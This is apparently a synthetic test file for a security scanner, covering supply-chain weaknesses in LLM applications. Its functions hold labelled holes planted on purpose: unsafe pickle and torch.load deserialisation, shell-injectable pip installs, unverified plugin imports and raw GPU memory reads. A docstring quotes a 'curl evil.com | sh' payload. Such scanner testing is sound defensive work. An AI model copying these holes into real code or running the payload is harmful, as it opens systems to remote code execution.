"""
OWASP LLM03 — Supply Chain Vulnerabilities
Dev Guardian Test: owasp_llm03_supply_chain.py
=======================================================
SYNTHETIC TEST FILE — Non-functional, for scanner testing only
Reference: OWASP Top 10 for LLM Applications 2025
=======================================================

Tests: Vulnerable/malicious third-party libraries, unverified model sources,
       GPU side-channel via library, unsafe pickle model loading.
       Supply Chain note: "Library usage to read GPU directly across user"
"""

import pickle
import subprocess
import os
import requests

# ── UNSAFE MODEL LOADING ──────────────────────────────────────────────────────

def load_model_from_url(model_url: str):
    """
    VULNERABLE: Downloads and deserialises model via pickle from untrusted URL.
    Malicious pickle payload can execute: os.system('curl evil.com | sh')
    """
    response = requests.get(model_url)
    model = pickle.loads(response.content)  # VULN: remote pickle deserialisation
    return model


def load_local_model(model_path: str):
    """
    VULNERABLE: Loads pickle model from user-supplied path — path traversal + RCE.
    """
    with open(model_path, "rb") as f:
        model = pickle.load(f)  # VULN: unsanitised path + pickle
    return model


# ── GPU SIDE-CHANNEL VIA LIBRARY ──────────────────────────────────────────────

def read_gpu_memory_via_library():
    """
    VULNERABLE: Uses ctypes/cuda to read GPU memory directly.
    Can access other users' model weights or inference data in shared GPU env.
    Supply Chain risk: malicious library dependency performing this covertly.
    """
    import ctypes
    # VULN: direct GPU memory access — cross-user data leakage in shared GPU
    cuda = ctypes.CDLL("libcuda.so")
    ptr = ctypes.c_void_p()
    size = ctypes.c_size_t(1024 * 1024)  # Read 1MB from GPU
    cuda.cuMemAlloc(ctypes.byref(ptr), size)
    buffer = (ctypes.c_char * size.value)()
    cuda.cuMemcpyDtoH(buffer, ptr, size)  # VULN: reads GPU memory cross-process
    return bytes(buffer)


# ── UNVERIFIED PACKAGE INSTALLATION ──────────────────────────────────────────

def install_model_dependencies(package_name: str):
    """
    VULNERABLE: Installs arbitrary pip packages at runtime from user input.
    Typosquatting: 'openai-utils' vs 'openai_utils' — different malicious pkg.
    """
    subprocess.run(
        f"pip install {package_name}",  # VULN: unsanitised package name
        shell=True                       # VULN: shell injection
    )


def load_plugin(plugin_path: str):
    """
    VULNERABLE: Dynamically imports unverified plugin — supply chain attack.
    No signature verification, no sandboxing.
    """
    import importlib.util
    spec = importlib.util.spec_from_file_location("plugin", plugin_path)  # VULN
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)  # VULN: executes arbitrary code
    return module


# ── UNPINNED DEPENDENCIES ─────────────────────────────────────────────────────

# VULN: requirements not pinned — version substitution attack possible
# Should be: openai==1.23.0, not openai>=1.0
REQUIREMENTS = """
openai>=1.0
langchain
transformers
torch
"""

def fetch_model_config(config_url: str) -> dict:
    """
    VULNERABLE: Fetches model config from external URL without integrity check.
    No SHA256 verification, no signature validation.
    """
    response = requests.get(config_url)  # VULN: no cert pinning, no integrity check
    config = response.json()
    return config


# ── UNSAFE DESERIALISATON OF MODEL ARTIFACTS ─────────────────────────────────

def load_fine_tuned_weights(weights_path: str):
    """
    VULNERABLE: torch.load with weights_only=False allows arbitrary code execution.
    CVE-class: malicious .pt file executes on load.
    """
    import torch
    model = torch.load(weights_path, weights_only=False)  # VULN: RCE via pickle
    return model
